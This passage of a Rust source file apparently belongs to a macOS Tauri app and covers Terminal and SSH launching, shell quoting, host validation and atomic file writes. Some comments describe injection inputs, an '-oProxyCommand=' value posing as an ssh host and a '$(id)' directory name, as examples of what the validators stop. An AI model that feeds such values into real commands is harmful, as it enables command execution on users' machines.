use std::process::Command;

use crate::sync::expand_remote_tilde;

/// Creates a Command and injects Homebrew/local paths on macOS to ensure consistent behavior between dev (terminal PATH) and build (macOS GUI PATH).
pub fn create_command(cmd: &str) -> Command {
    let mut c = Command::new(cmd);
    #[cfg(target_os = "macos")]
    {
        let current_path = std::env::var("PATH").unwrap_or_default();
        let new_path = if current_path.is_empty() {
            "/opt/homebrew/bin:/usr/local/bin".to_string()
        } else {
            format!("/opt/homebrew/bin:/usr/local/bin:{}", current_path)
        };
        c.env("PATH", new_path);
    }
    c
}

#[derive(serde::Serialize)]
pub struct IdeAvailability {
    pub vscode: bool,
    pub vscode_insiders: bool,
    pub antigravity: bool,
}

/// The single answer in this app to "is this string safe to hand to `ssh`/`rsync` as a host".
///
/// Two separate dangers, which is why an empty allowlist is the wrong shape and a leading `-` is
/// rejected on its own line:
///   1. A host reaching a *shell* string (`ssh host 'cmd'` built by hand) could carry `;` or
///      `$(…)`. The character allowlist closes that.
///   2. A host reaching `ssh` as a bare **argv element** never touches a shell - but `ssh` parses
///      its own argv, so a value beginning with `-` is read as an *option*, not a hostname.
///      `-oProxyCommand=…` makes ssh run that command **locally on this Mac**. Every character in
///      it is alphanumeric/`.`/`-`/`=`, so the allowlist alone would wave it through; `=` not being
///      allowed happens to stop today's exact payload, but the class is "argv that looks like a
///      flag", so it is rejected explicitly rather than by lucky side effect.
///
/// Must be called at EVERY boundary where a persisted host becomes a process argument - the
/// frontend is not trusted, and a companion device can send a project record directly.
pub fn validate_remote_host(host: &str) -> Result<(), String> {
    if host.starts_with('-') {
        return Err(format!(
            "Remote host '{}' cannot start with '-' (ssh would read it as an option, not a host)",
            host
        ));
    }
    if host
        .chars()
        .all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_' || c == '@')
    {
        Ok(())
    } else {
        Err(format!("Remote host '{}' contains unsafe characters", host))
    }
}

/// Writes `contents` to `path` atomically: a temp file **in the same directory** (so the rename
/// cannot cross a filesystem boundary and silently degrade to copy-then-truncate), then `rename`
/// over the target.
///
/// The point is not tidiness. `fs::write` truncates first and writes after, so a crash, a forced
/// quit, or a full disk between those two steps leaves the user's real file empty or half-written.
/// Every file this app owns on the user's disk - the project list, the global note, Claude Code's
/// own `settings.json` - is one where a truncated file loses data that was never the app's to lose.
/// With `rename`, a reader either sees the whole old file or the whole new one, never a stump.
pub fn write_atomic(path: &std::path::Path, contents: &str) -> Result<(), String> {
    let dir = path
        .parent()
        .ok_or_else(|| format!("Cannot resolve a parent directory for '{}'", path.display()))?;
    std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;

    let tmp = dir.join(format!(
        ".{}.aki-tmp",
        path.file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "write".to_string())
    ));
    std::fs::write(&tmp, contents).map_err(|e| format!("Failed to write '{}': {}", tmp.display(), e))?;
    std::fs::rename(&tmp, path).map_err(|e| {
        // Leaving the temp file behind after a failed rename only adds a second broken thing to explain; the target is still intact, which is the property that matters.
        let _ = std::fs::remove_file(&tmp);
        format!("Failed to replace '{}': {}", path.display(), e)
    })
}

/// How many timestamped backups of any one file this app keeps. Enough to walk back through a few
/// bad edits, small enough that the pile cannot grow without bound.
pub const BACKUP_KEEP: usize = 5;

/// Deletes all but the newest [`BACKUP_KEEP`] files in `dir` whose name starts with `prefix`.
///
/// Every `*.aki-bak-<unix_ts>` writer in this app stamps a NEW backup on EVERY write - deliberately,
/// because a "back up once" scheme destroys the only copy on the second edit. The cost of that
/// choice is an unbounded pile, and these particular files are not innocuous: `settings.json`
/// carries a plaintext `ANTHROPIC_AUTH_TOKEN` and `.zshrc` carries whatever the user keeps in it,
/// so every extra copy is another copy of a secret sitting in a world-readable home directory,
/// kept forever. Retention closes that without giving up the per-write backup.
///
/// Newest is decided by the numeric suffix after the last `-` (the writers' own timestamp), not by
/// mtime - a copied file's mtime is not reliably its creation order. A name whose suffix does not
/// parse sorts oldest, so a stray same-prefix file is pruned before any real backup is.
///
/// Best-effort throughout: this runs right after a backup the user's data depends on, and failing
/// to prune must never be reported as failing to back up.
pub fn prune_timestamped_backups(dir: &std::path::Path, prefix: &str, keep: usize) {
    let Ok(entries) = std::fs::read_dir(dir) else { return };

    let mut backups: Vec<(u64, std::path::PathBuf)> = entries
        .flatten()
        .filter_map(|e| {
            let name = e.file_name().to_string_lossy().to_string();
            let rest = name.strip_prefix(prefix)?;
            Some((rest.parse::<u64>().unwrap_or(0), e.path()))
        })
        .collect();

    if backups.len() <= keep {
        return;
    }

    backups.sort_by(|a, b| b.0.cmp(&a.0));
    for (_, path) in backups.into_iter().skip(keep) {
        if let Err(e) = std::fs::remove_file(&path) {
            crate::logger::error(
                "backup",
                &format!("could not prune old backup '{}': {}", path.display(), e),
            );
        }
    }
}

/// Escapes a string for embedding inside an **AppleScript double-quoted literal**. This is the
/// outermost layer only (the one `osascript` itself parses) - it says nothing about what the shell
/// underneath will do with the result, which is `shell_quote`'s job. Newlines are escaped too: a
/// raw newline inside an AppleScript string literal is a syntax error, and a directory name may
/// legally contain one on APFS.
fn applescript_escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}

/// Quotes `s` as ONE literal POSIX shell word. This is the single funnel every path, filename or
/// other user-controlled string must pass through before being interpolated into a command string
/// that a shell will parse - locally (Terminal.app / `$SHELL -ilc`) or remotely (the login shell
/// `ssh` hands the command to).
///
/// Single quotes, not double: inside `"…"` the shell still honours `$`, `` ` `` and `\`, which is
/// exactly how a directory named `it's $(id)` used to execute `id` (plan §2.2). Inside `'…'`
/// **nothing** is special, so the only case to handle is a literal `'`, closed and reopened as
/// `'\''`. Same semantics as the in-app terminal's `cd` helper (`usePtyTerminal.js`), kept
/// identical on purpose so both paths behave the same for the same directory name.
///
/// Reusable by any other module that builds a shell string (e.g. `sync.rs`'s remote `mkdir -p`).
pub fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Quotes a **remote** path for a remote shell while keeping a leading `~` / `$HOME` expandable by
/// that shell - the one case plain `shell_quote` cannot serve, because the home directory is only
/// known on the other end.
///
/// Only the leading segment is emitted unquoted (as `"$HOME"`, itself double-quoted so a home path
/// containing spaces stays one word); everything after the first `/` is quoted literally. So a
/// `$(…)`, backtick or quote *anywhere in the user's own text* is inert, and the sole expansion the
/// remote shell performs is the one we deliberately asked for.
pub fn shell_quote_remote_path(path: &str) -> String {
    if path == "~" || path == "$HOME" {
        return "\"$HOME\"".to_string();
    }
    if let Some(rest) = path.strip_prefix("~/").or_else(|| path.strip_prefix("$HOME/")) {
        return format!("\"$HOME\"/{}", shell_quote(rest));
    }
    shell_quote(path)
}

/// Runs `shell_cmd` in Terminal.app via AppleScript, avoiding the double-window bug where a cold-started Terminal spawns its own default (home-dir) window at launch *and* `do script` spawns a second one for the command. When Terminal has to be launched from scratch, we reuse its freshly-created default window (`in window 1`) instead of letting `do script` open another; when Terminal is already running, behavior is unchanged (`do script` opens a new window as before).
///
/// The wait for that default window is a poll (up to ~2s, checking every 100ms), not a fixed `delay` - a flat delay races a slow shell startup (heavy .zshrc: nvm, conda, etc.): if the window isn't up yet when we check, we'd fall through to `do script` opening a *second* window, and the slow default window would still appear on its own moments later (the exact "one window at $HOME + one at the right target" bug this helper exists to prevent).
///
/// Returns the new session's tty (`/dev/ttysNNN`, as AppleScript reports it - normalized by the caller), or `""` when it could not be read back. That empty string is not handled here: reading it is the ONE subprocess boundary where osascript's output enters this app (`docs/plan/done/terminal-ownership-model.md` §3/§8), so this is where a failure or an empty result is logged - a Mac run can then tell "the AppleScript contract broke" apart from "this session genuinely has no tty" from the log alone. What a caller DOES with an empty tty (nothing: the session simply stays untagged and today's cwd-adoption reading applies unchanged) is decided in exactly one place downstream, `tag_terminal_launch` - never re-branched here or at each call site.
///
/// UNVERIFIED on this box (no `osascript` here): that `tty of t` resolves to a populated string in
/// the same script that opened it, and that switching `.spawn()` to `.output()` only adds the
/// AppleScript's own ~2s cold-start poll to this call's latency rather than a new failure mode.
#[cfg(target_os = "macos")]
fn open_terminal_with_command(shell_cmd: &str) -> Result<String, String> {
    let safe_cmd = applescript_escape(shell_cmd);
    let script = format!(
        "tell application \"Terminal\"\n\
         \tset wasOff to not running\n\
         \tif wasOff then\n\
         \t\tlaunch\n\
         \t\trepeat 20 times\n\
         \t\t\tif (count of windows) > 0 then exit repeat\n\
         \t\t\tdelay 0.1\n\
         \t\tend repeat\n\
         \tend if\n\
         \tif wasOff and (count of windows) > 0 then\n\
         \t\tset t to do script \"{cmd}\" in window 1\n\
         \telse\n\
         \t\tset t to do script \"{cmd}\"\n\
         \tend if\n\
         \tactivate\n\
         \treturn tty of t\n\
         end tell",
        cmd = safe_cmd
    );
    let out = Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output()
        .map_err(|e| format!("Failed to open Terminal: {}", e))?;
    snap_frontmost_terminal_window();
    let tty = if out.status.success() {
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    } else {
        String::new()
    };
    if tty.is_empty() {
        // Non-fatal by design: the window itself already opened (or the caller's own error path above already fired) - only the tty readback failed. Logged, not surfaced to the user (Extreme Narrow), so the degrade to cwd-adoption stays invisible in the UI.
        crate::logger::info(
            "terminal-owner",
            &format!(
                "tty readback empty (osascript exit={}); session falls back to cwd adoption",
                out.status
            ),
        );
    }
    Ok(tty)
}

/// Resizes/repositions the Terminal window this call just opened to 124 columns, snapped to the top-right corner of the main display (below the menu bar, above the Dock), height filling the available screen height. Fire-and-forget in its own `osascript` process, started right after the one that opens the window - it sleeps briefly up front so the new window exists and has settled before being resized, matching every other caller of Terminal in this file (spawn, no wait).
///
/// Resize (`numberOfColumns`) happens first, at the window's original (cascaded) position where it has room to grow; only once the true post-resize width is known does the single `bounds` write move+resize it into the target rectangle - resizing before positioning, not after, so the width read back is the true 124-column width, not one clipped by an edge the window was already pinned to.
///
/// The move+resize itself goes through System Events' Accessibility API (`AXPosition`/`AXSize` on the window element), not Terminal's own scriptable `bounds` property - `bounds` was proven (logged bounds at every step, see PR discussion) to silently refuse a cross-screen jump: X moved correctly but Y stayed within a few px of its original (wrong) value whenever the target Y belonged to a different display than the one the window opened on. AXPosition/AXSize apply cleanly to both axes regardless of which screen the window currently occupies. Requires System Events to have Accessibility permission for whatever process runs `osascript` - macOS will prompt for this on first use if not already granted.
#[cfg(target_os = "macos")]
fn snap_frontmost_terminal_window() {
    let script = r#"
ObjC.import('AppKit');
ObjC.import('Foundation');
var Terminal = Application('Terminal');
var SystemEvents = Application('System Events');
$.NSThread.sleepForTimeInterval(0.6);
if (Terminal.windows.length === 0) { $.exit(0); }
var win = Terminal.windows[0];

win.numberOfColumns = 124;
$.NSThread.sleepForTimeInterval(0.2);
var w = win.bounds().width;

var screens = $.NSScreen.screens;
var target = null;
for (var i = 0; i < screens.count; i++) {
  var s = screens.objectAtIndex(i);
  if (s.frame.origin.x === 0 && s.frame.origin.y === 0) { target = s; break; }
}
if (!target) target = screens.objectAtIndex(0);
var vf = target.visibleFrame;
var full = target.frame;
var screenHeight = full.size.height;
var topY = screenHeight - (vf.origin.y + vf.size.height);
var bottomY = screenHeight - vf.origin.y;
var rightX = vf.origin.x + vf.size.width;
var targetX = rightX - w;
var targetH = bottomY - topY;

var proc = SystemEvents.processes.byName('Terminal');
var axWin = proc.windows[0];
axWin.position = [targetX, topY];
$.NSThread.sleepForTimeInterval(0.2);
axWin.size = [w, targetH];
"#;
    let _ = Command::new("osascript")
        .arg("-l")
        .arg("JavaScript")
        .arg("-e")
        .arg(script)
        .spawn();
}

/// Passes args directly to macOS `open`. JS is responsible for building the arg list.
///
/// The exit status is READ, not discarded: `open` is the only thing that can tell us a
/// `vscode://…` URI has no handler, or that the requested `.app` is not installed. The old
/// `spawn()`-and-forget form always reported success, so a wrong URI (e.g. an unresolved remote
/// path) looked identical to a working one at the call site.
///
/// Waiting on a child is exactly the case CLAUDE.md's NEVER-BLOCK-THE-UI rule covers, hence
/// `async fn` + `spawn_blocking`.
#[tauri::command]
pub async fn macos_open(args: Vec<String>) -> Result<(), String> {
    tauri::async_runtime::spawn_blocking(move || {
        let out = Command::new("open")
            .args(&args)
            .output()
            .map_err(|e| format!("Failed to open: {}", e))?;
        if out.status.success() {
            return Ok(());
        }
        let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
        Err(if stderr.is_empty() {
            format!("`open` failed ({})", out.status)
        } else {
            stderr
        })
    })
    .await
    .map_err(|e| format!("Failed to open: {}", e))?
}

/// `Err` unless `path` is an existing directory on this Mac.
///
/// Terminal.app's `do script` cannot report failure back to us: a `cd` into a path that is not
/// there scrolls past inside a window that opened anyway, while the caller had already shown a
/// success toast. Checking first is the only place the user can be told.
///
/// `is_dir()` is cheap on a healthy local disk, but a project path on an unmounted or wedged
/// SMB/NFS volume makes it stall in the kernel for tens of seconds - which is why every command
/// that calls this runs it inside `spawn_blocking` rather than on the IPC dispatch thread
/// (stack-tauri A1). The rule's "a single Path::exists() is fine" carve-out assumes a local disk;
/// a user-supplied project path carries no such guarantee.
#[cfg(target_os = "macos")]
fn ensure_local_dir(path: &str) -> Result<(), String> {
    if std::path::Path::new(path).is_dir() {
        Ok(())
    } else {
        Err(format!("Local folder not found: {}", path))
    }
}

/// Opens a local Terminal window `cd`'d into `local_path`. Routed through `open_terminal_with_command` (not a plain `open -a Terminal <path>` via `macos_open`) so it gets the same cold-start double-window protection as the SSH terminal.
///
/// `local_path` is optional (contract C-1 with the in-app terminal, which sends `null` when it cannot read the shell's cwd). Absent, empty, or the bare string `~` all mean **no `cd` at all** - the new shell then starts in `$HOME` by itself, which is what the caller wanted. Emitting `cd "~"` instead, as this used to, never worked: a tilde inside quotes is not expanded, so the window opened and immediately printed "no such file or directory".
///
/// `owner` is the spawn-origin tag (`docs/plan/done/terminal-ownership-model.md` §3/S3/S4) - a project id, or the global-scope token, passed straight through to `tag_terminal_launch` with no branch of its own here; whether it actually lands in the registry is decided in that one place.
#[tauri::command]
pub async fn open_local_terminal(
    local_path: Option<String>,
    owner: Option<String>,
    state: tauri::State<'_, TerminalOwnership>,
) -> Result<(), String> {
    let ownership = state.inner().clone();
    // spawn_blocking for `ensure_local_dir`: a project on a wedged network volume makes that single stat block for tens of seconds, and on the dispatch thread that is a frozen window.
    tauri::async_runtime::spawn_blocking(move || {
        #[cfg(target_os = "macos")]
        {
            let path = local_path.unwrap_or_default();
            let path = path.trim();
            let shell_cmd = if path.is_empty() || path == "~" {
                String::new()
            } else {
                ensure_local_dir(path)?;
                format!("cd {}", shell_quote(path))
            };
            let tty = open_terminal_with_command(&shell_cmd)?;
            tag_terminal_launch(&ownership, &tty, owner);
        }
        #[cfg(not(target_os = "macos"))]
        {
            let _ = (local_path, owner, ownership);
        }
        Ok::<(), String>(())
    })
    .await
    .map_err(|e| format!("spawn_blocking panicked: {}", e))?
}

/// Resolves the `antigravity-ide` CLI into `$AGY_BIN` via static `[ -x path ]` checks before falling back to PATH lookup, then is prefixed to the command run inside the login shell below. Same cold-start PATH race, same fix pattern, and same reason as `agent_usage.rs`'s `NODE_BIN_RESOLVER_PREAMBLE` (stack-tauri A2): a `[ -x ]` test does not care whether the user's rc files have finished sourcing, whereas `-ilc` PATH resolution alone does. It matters more here than it looks, because the call site only `spawn()`s and never reads the exit code - a 127 from a lost PATH race is completely silent, the user just sees nothing happen.
///
/// The two `/Applications` bundle names are the same pair `check_ide_availability` probes; the in-bundle `Contents/Resources/app/bin/antigravity-ide` is what the IDE's own "install command in PATH" action symlinks to, so hitting the bundle directly is strictly more reliable than following the symlink. macOS-only list (this app ships macOS-only, see CLAUDE.md).
///
/// Unlike the node resolver this needs no `sh -c '...'` wrapper or single-line/no-single-quote discipline: it is handed to a known POSIX-compatible shell (`$SHELL`/bash) as one argv item by this process, not re-parsed by an arbitrary remote login shell chosen by sshd.
const AGY_BIN_RESOLVER_PREFIX: &str = r#"for _c in "/Applications/Antigravity IDE.app/Contents/Resources/app/bin/antigravity-ide" "/Applications/Antigravity.app/Contents/Resources/app/bin/antigravity-ide" "$HOME/.antigravity-ide/antigravity-ide/bin/antigravity-ide" "$HOME/.local/bin/antigravity-ide" /opt/homebrew/bin/antigravity-ide /usr/local/bin/antigravity-ide; do
    [ -x "$_c" ] && { AGY_BIN=$_c; break; }
done
[ -n "$AGY_BIN" ] || AGY_BIN=$(command -v antigravity-ide 2>/dev/null)
[ -n "$AGY_BIN" ] || AGY_BIN=antigravity-ide
"#;

/// Builds the exact `ssh … -t …` command line the native "SSH Terminal" popup entry launches in Terminal.app (see `open_remote_subprocess`'s "terminal" branch below), so the in-app terminal's "SSH Terminal (In-App)" popup entry can type the identical command into a PTY tab instead of spawning a second, external terminal window. Pure string construction, no subprocess — safe to call from a companion.
#[tauri::command]
pub fn build_remote_ssh_command(host: String, path: String) -> Result<String, String> {
    validate_remote_host(&host)?;
    let qpath = shell_quote_remote_path(&path);
    let remote_cmd = format!("mkdir -p {q} && cd {q} ; exec bash", q = qpath);
    Ok(format!("ssh {} -t {}", host, shell_quote(&remote_cmd)))
}

/// Subprocess-based remote openers that cannot be expressed as a plain `open` call:
/// - `terminal`: SSH via AppleScript (macOS-only)
/// - `antigravity`: `antigravity-ide --remote` CLI
///
/// `async fn` + `spawn_blocking` since S3 (`docs/plan/done/terminal-ownership-model.md` §8): this used to be a plain synchronous `pub fn` and got away with it only because it never waited on its child (`.spawn()`, fire-and-forget). The `terminal` branch now reads the AppleScript's stdout back via `open_terminal_with_command`'s `.output()`, which blocks on that child - so the whole function must move off the IPC dispatch thread in the same step (stack-tauri A1), not later.
///
/// `owner` is passed straight through to `tag_terminal_launch`, unconditionally, same as `open_local_terminal` - the `antigravity` branch never reads it, since it opens no `Terminal.app` session to tag.
#[tauri::command]
pub async fn open_remote_subprocess(
    ide_name: String,
    host: String,
    path: String,
    owner: Option<String>,
    state: tauri::State<'_, TerminalOwnership>,
) -> Result<(), String> {
    validate_remote_host(&host)?;
    let ownership = state.inner().clone();
    tauri::async_runtime::spawn_blocking(move || match ide_name.as_str() {
        "terminal" => {
            #[cfg(target_os = "macos")]
            {
                // Two shell layers, quoted separately - the bug the old single-layer `'…"{}"…'`
                // had was that a `'` in the path closed the outer quote and a `$(…)` inside the
                // inner double quotes ran on the remote host.
                // Inner: what the REMOTE login shell parses. `shell_quote_remote_path` keeps a
                // leading `~` expandable there and freezes the rest.
                // Outer: what the LOCAL Terminal shell parses, one `shell_quote`d argv item that
                // ssh forwards intact. `host` is charset-validated above, so it needs no quoting.
                // AppleScript escaping is applied separately by `open_terminal_with_command`.
                let qpath = shell_quote_remote_path(&path);
                let remote_cmd = format!("mkdir -p {q} && cd {q} ; exec bash", q = qpath);
                let shell_cmd = format!("ssh {} -t {}", host, shell_quote(&remote_cmd));
                let tty = open_terminal_with_command(&shell_cmd)?;
                tag_terminal_launch(&ownership, &tty, owner);
            }
            #[cfg(not(target_os = "macos"))]
            {
                let _ = (owner, ownership);
            }
            Ok(())
        }
        "antigravity" => {
            let expanded = expand_remote_tilde(&path);
            // Use login shell so antigravity-ide is found via user PATH (JetBrains Toolbox, custom profile setup, etc.) - not available in macOS GUI app's stripped PATH. Prefer $SHELL (zsh on macOS Catalina+) so ~/.zshrc is sourced; fall back to bash.
            let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/bash".to_string());
            // Same escaping as before, now routed through the shared helper instead of an inline
            // copy of it. The path is an argument to the CLI, not something a remote shell
            // re-parses, so it is quoted whole (no `$HOME` carve-out).
            let shell_cmd = format!(
                "{}exec \"$AGY_BIN\" --remote 'ssh-remote+{}' {}",
                AGY_BIN_RESOLVER_PREFIX,
                host,
                shell_quote(&expanded)
            );
            // -ilc: interactive (-i) sources ~/.zshrc (not just ~/.zprofile); login (-l) sources ~/.zprofile. Both needed because antigravity-ide PATH is typically set in ~/.zshrc, which a non-interactive login shell (-lc) never reads - causing silent failure when the app launches from Finder vs. from a terminal that already inherited full PATH.
            Command::new(&shell)
                .args(["-ilc", &shell_cmd])
                .spawn()
                .map_err(|e| format!("Failed to open Antigravity remotely: {}", e))?;
            Ok(())
        }
        _ => Err(format!("Unknown subprocess target: {}", ide_name)),
    })
    .await
    .map_err(|e| format!("spawn_blocking panicked: {}", e))?
}

const SSH_COLOR_MARKER_BEGIN: &str = "# --- Aki SSH remote color BEGIN (managed by Aki Dev Sync - safe to remove) ---";
const SSH_COLOR_MARKER_END: &str = "# --- Aki SSH remote color END ---";

/// Wraps `ssh` so the local Terminal.app/iTerm2 background tints while a remote session is active, then resets on exit - the same OSC 11/111 background-swap trick the user already hand-rolled locally, packaged so it can be (re)installed from the app. Idempotent: re-running strips any previously-installed block (between the markers) before writing a fresh one, so repeated installs never duplicate.
const SSH_COLOR_SNIPPET: &str = r#"
ssh() {
  printf '\033]11;#1a0f0f\007'
  command ssh "$@"
  printf '\033]111\007'
}
"#;

/// Reads a file that is about to be **rewritten from its own contents**, and refuses to guess.
///
/// The only benign failure is `NotFound` - the file genuinely does not exist yet, so "" is the
/// truthful prior content and creating it fresh is correct. Every other error (`PermissionDenied`,
/// a device/IO fault, a path that is a directory, an interrupted read) means the current contents
/// are *unknown*, and treating unknown as empty is how a read-modify-write turns into a silent
/// truncation: the caller would append its snippet to nothing and write that over a file that was
/// never read. `unwrap_or_default()` cannot tell those two cases apart, which is exactly why it
/// must not be used at a read-then-rewrite site (plan §3.20).
///
/// Returns the error as a user-facing string, because the user's only clue otherwise arrives much
/// later, when their next terminal opens broken.
fn read_for_rewrite(path: &std::path::Path) -> Result<String, String> {
    match std::fs::read_to_string(path) {
        Ok(s) => Ok(s),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(String::new()),
        Err(e) => Err(format!(
            "Cannot read {} ({}). Nothing was written - the file is unchanged.",
            path.display(),
            e
        )),
    }
}

/// Local-machine-only: the background swap needs to happen in the *local* shell that is launching `ssh`, so there is nothing to push to remote hosts here (unlike the statusline customizer, which does need per-host rollout).
///
/// `spawn_blocking`-wrapped per CLAUDE.md's blocking-UI rule: even "just" file I/O is a synchronous syscall, and the house rule now has zero exceptions for that - every command touching disk or a subprocess goes through the blocking thread-pool, no case-by-case judgment calls about whether a given file happens to be small.
#[tauri::command]
pub async fn install_ssh_terminal_color() -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(|| {
        let home = std::env::var("HOME").map_err(|e| e.to_string())?;
        let zshrc_path = std::path::Path::new(&home).join(".zshrc");
        // Read-then-rewrite: an unreadable .zshrc must abort, never be re-created from "".
        let existing = read_for_rewrite(&zshrc_path)?;

        let mut kept_lines: Vec<&str> = Vec::new();
        let mut skipping = false;
        for line in existing.lines() {
            if line == SSH_COLOR_MARKER_BEGIN {
                skipping = true;
                continue;
            }
            if line == SSH_COLOR_MARKER_END {
                skipping = false;
                continue;
            }
            if !skipping {
                kept_lines.push(line);
            }
        }

        let mut new_content = kept_lines.join("\n");
        if !new_content.is_empty() && !new_content.ends_with('\n') {
            new_content.push('\n');
        }
        new_content.push_str(SSH_COLOR_MARKER_BEGIN);
        new_content.push_str(SSH_COLOR_SNIPPET);
        new_content.push_str(SSH_COLOR_MARKER_END);
        new_content.push('\n');

        // Timestamped on every install, never "once ever". The old `if !backup_path.exists()`
        // guard meant the first install kept a copy and every install after it destroyed whatever
        // the user had hand-edited since, with no copy anywhere - the same defect already retired
        // from the statusline installer.
        if zshrc_path.exists() {
            let stamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let backup_path =
                std::path::Path::new(&home).join(format!(".zshrc.aki-bak-{}", stamp));
            std::fs::copy(&zshrc_path, &backup_path).map_err(|e| e.to_string())?;
            // Bounded after the copy succeeds - see `prune_timestamped_backups`. A `.zshrc` is often where a user keeps export-ed tokens, so the pile is not innocuous either.
            prune_timestamped_backups(std::path::Path::new(&home), ".zshrc.aki-bak-", BACKUP_KEEP);
        }
        // Atomic: `.zshrc` is the user's own file and a truncated one breaks every new shell.
        write_atomic(&zshrc_path, &new_content)?;
        Ok(zshrc_path.to_string_lossy().to_string())
    })
    .await
    .map_err(|e| format!("spawn_blocking panicked: {}", e))?
}

/// Resolves the local AkiClaudeDoc checkout by trying well-known candidate paths first (same conservative pattern as the CLAUDE_BIN resolver - a file-existence check has no dependency on where any given machine happens to keep its dev tree), so it's never a guess. Its exact location varies per machine (see CLAUDE.md), so if none of these hit, the caller falls back to pointing the user at the GitHub repo to clone it.
fn find_akiclaudedoc_install_script(home: &str) -> Option<String> {
    let candidates = [
        "/Volumes/DEV/AkiClaudeDoc/install.sh".to_string(),
        format!("{}/AkiClaudeDoc/install.sh", home),
        format!("{}/dev/AkiClaudeDoc/install.sh", home),
        format!("{}/Developer/AkiClaudeDoc/install.sh", home),
        format!("{}/Documents/AkiClaudeDoc/install.sh", home),
    ];
    candidates.into_iter().find(|c| std::path::Path::new(c).exists())
}

/// Runs the local AkiClaudeDoc `install.sh` in a visible Terminal window (the script prints colored progress output the user should see), or errors out pointing at the repo to clone if no checkout is found on this machine.
///
/// `async fn` + `spawn_blocking`: `open_terminal_with_command` now reads the AppleScript's stdout
/// back via `.output()`, which blocks - same reason as `open_local_terminal`/`open_remote_subprocess`
/// (stack-tauri A1).
#[tauri::command]
pub async fn install_akiclaudedoc() -> Result<(), String> {
    tauri::async_runtime::spawn_blocking(|| {
        let home = std::env::var("HOME").map_err(|e| e.to_string())?;
        match find_akiclaudedoc_install_script(&home) {
            #[cfg(target_os = "macos")]
            Some(script) => {
                let shell_cmd = format!("bash {}", shell_quote(&script));
                // No owner to tag here - this opens a one-off installer window, not a project session.
                open_terminal_with_command(&shell_cmd).map(|_tty| ())
            }
            #[cfg(not(target_os = "macos"))]
            Some(_) => Ok(()),
            None => Err(
                "Không tìm thấy AkiClaudeDoc trên máy này. Clone repo trước: https://github.com/lacvietanh/AkiClaudeDoc"
                    .to_string(),
            ),
        }
    })
    .await
    .map_err(|e| format!("spawn_blocking panicked: {}", e))?
}

use std::sync::{Arc, Mutex, OnceLock};
use std::collections::HashMap;
use crate::projects::SyncProject;

pub struct IconData {
    pub bytes: Vec<u8>,
    pub mime_type: String,
}

static PROJECT_ICONS: OnceLock<Mutex<HashMap<String, IconData>>> = OnceLock::new();

pub fn get_project_icons() -> &'static Mutex<HashMap<String, IconData>> {
    PROJECT_ICONS.get_or_init(|| Mutex::new(HashMap::new()))
}

pub fn load_and_cache_project_icons(projects: &[SyncProject]) {
    let mut cache = get_project_icons().lock().unwrap();
    cache.clear();

    for project in projects {
        let path = std::path::Path::new(&project.local_path);
        let is_nuxt = path.join("nuxt.config.ts").exists() || path.join("nuxt.config.js").exists();
        let is_tauri = path.join("src-tauri/tauri.conf.json").exists();
        let is_web = !is_nuxt && !is_tauri && (path.join("package.json").exists() || path.join("index.html").exists());

        let candidates = if is_tauri {
            vec![
                "src-tauri/icons/32x32.png",
                "src-tauri/icons/64x64.png",
                "src-tauri/icons/icon.png",
                "src-tauri/icons/128x128.png",
            ]
        } else if is_nuxt || is_web {
            vec![
                "public/favicon/icon-48.png",
                "public/favicon.ico",
                "public/favicon/favicon.ico",
                "public/favicon/icon-192.png",
                "public/icon.png",
                "favicon.ico",
                "icon.png",
            ]
        } else {
            vec![
                "public/favicon/icon-48.png",
                "public/favicon.ico",
                "public/favicon/favicon.ico",
                "public/icon.png",
                "favicon.ico",
                "icon.png",
            ]
        };

        let mut best: Option<(std::path::PathBuf, u64, &str)> = None;
        for icon in &candidates {
            let icon_path = path.join(icon);
            if let Ok(meta) = std::fs::metadata(&icon_path) {
                let size = meta.len();
                if best
                    .as_ref()
                    .is_none_or(|(_, best_size, _)| size < *best_size)
                {
                    best = Some((icon_path, size, icon));
                }
            }
        }

        if let Some((icon_path, size, icon_name)) = best {
            if size <= 250_000 {
                if let Ok(bytes) = std::fs::read(&icon_path) {
                    let mime_type = if icon_name.ends_with(".png") {
                        "image/png".to_string()
                    } else {
                        "image/x-icon".to_string()
                    };
                    cache.insert(project.id.clone(), IconData { bytes, mime_type });
                }
            }
        }
    }
}

#[tauri::command]
pub fn check_ide_availability() -> IdeAvailability {
    #[cfg(target_os = "macos")]
    {
        IdeAvailability {
            vscode: std::path::Path::new("/Applications/Visual Studio Code.app").exists(),
            vscode_insiders: std::path::Path::new(
                "/Applications/Visual Studio Code - Insiders.app",
            )
            .exists(),
            antigravity: std::path::Path::new("/Applications/Antigravity IDE.app").exists()
                || std::path::Path::new("/Applications/Antigravity.app").exists(),
        }
    }
    #[cfg(not(target_os = "macos"))]
    IdeAvailability {
        vscode: false,
        vscode_insiders: false,
        antigravity: false,
    }
}

#[tauri::command]
pub async fn resolve_remote_path(host: String, path: String) -> Result<String, String> {
    if !path.starts_with("~/") && path != "~" && !path.contains("$HOME") {
        return Ok(path);
    }

    // The SSH round-trip is blocking IO. This command used to be a plain `pub fn`, so Tauri ran it on the main thread and the whole UI froze for the duration of the network call. Move it onto the blocking pool (CLAUDE.md "async fn + blocking subprocess" pitfall) so the UI stays responsive while the resolve is in flight.
    tauri::async_runtime::spawn_blocking(move || {
        let mut command = create_command("ssh");
        // Three shells parse this in turn, so it is quoted three times over, innermost first:
        //   1. `shell_quote_remote_path` - only a leading `~`/`$HOME` stays expandable; the rest of
        //      the user's path is literal, so a `$(…)` in it can no longer execute ON THE SERVER
        //      (the old `bash -c "echo {}"` interpolated it raw inside double quotes).
        //   2. `shell_quote` of the whole `echo …` - what `bash -c` receives as one argument.
        //   3. one argv item to ssh, so ssh forwards it intact instead of splitting on spaces.
        let echo_cmd = format!("echo {}", shell_quote_remote_path(&path));
